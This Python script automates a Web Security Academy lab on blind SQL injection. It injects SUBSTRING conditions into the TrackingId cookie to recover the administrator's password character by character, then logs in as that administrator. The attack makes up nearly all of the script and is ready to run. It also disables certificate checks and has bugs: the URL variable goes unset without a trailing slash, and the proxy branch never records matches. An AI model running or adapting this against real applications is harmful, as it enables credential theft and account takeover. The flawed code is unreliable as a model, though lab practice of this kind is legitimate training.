#!/usr/bin/env python3 

import requests
import urllib3
import argparse
import subprocess
import string
from bs4 import BeautifulSoup
from argparse import RawTextHelpFormatter

# Disable warnings related to certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description="""SQL Injection Web Security Academy

Example usage with proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -p 127.0.0.1:8080

Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" 
""", usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
parser.add_argument('-u', '--url', help='URL, Example: https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net', required=True)
parser.add_argument('-p', '--proxy', help='Proxy, Example: 127.0.0.1:8080', required=False)
args = parser.parse_args()

if args.url.endswith("/"):
    url = args.url
else: 
    print("(-) Add / to the end of URL")
s = requests.Session()

def get_csrf(s, url):
    path = 'login'
    req = s.get(url + path, verify=False)
    soup = BeautifulSoup(req.text, 'html.parser')
    global csrf
    csrf = soup.find("input")['value']
    return csrf

def sqli(url):
    r = s.get(url, verify=False)
    cookies = r.cookies.get_dict()
    tr_id = cookies['TrackingId']
    session = cookies['session']
    position = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21']
    alph_str = string.ascii_lowercase
    alph_lst = list(alph_str)
    alphnum_lst = alph_lst + ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
    a = []
    for i in position:
        for j in alphnum_lst:
            cmd = "' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), " + i + ", 1) = '" + j + ""
            tr_id_var = "TrackingId=" + tr_id + cmd + ";"
            session_var = " session=" + session
            headers = {
                'Cookie': tr_id_var + session_var
            }
            if args.proxy:
                args.proxy=str(args.proxy)
                proxies = {
                    'http': 'http://' + args.proxy,
                    'https': 'http://' + args.proxy,
                }
                r = s.get(url, headers=headers, verify=False, proxies=proxies)
            else: 
                r = s.get(url, headers=headers, verify=False)
                if (b'Welcome back!' in r.content):
                    a.append(j)
                else: 
                    pass
    global admin_pwd
    admin_pwd = ''.join(a)
    return admin_pwd

def login(url, csrf, admin_pwd):
    data = {
        'csrf': csrf,
        'username': 'administrator',
        'password': admin_pwd
    }
    s.post(url + 'login', data=data, verify=False)
    r1 = s.get(url, verify=False)
    # verify the response contains Congratulations, you solved the lab!
    if (b'Congratulations, you solved the lab!' in r1.content):
        print("(+) SQL Injection Successful!")
        subprocess.call(["firefox", url])

def main():
    
    print("(+) Exploiting SQL Injection")
        
    sqli(url)

    get_csrf(s, url)
    
    login(url, csrf, admin_pwd)

if __name__ == "__main__":
    main()
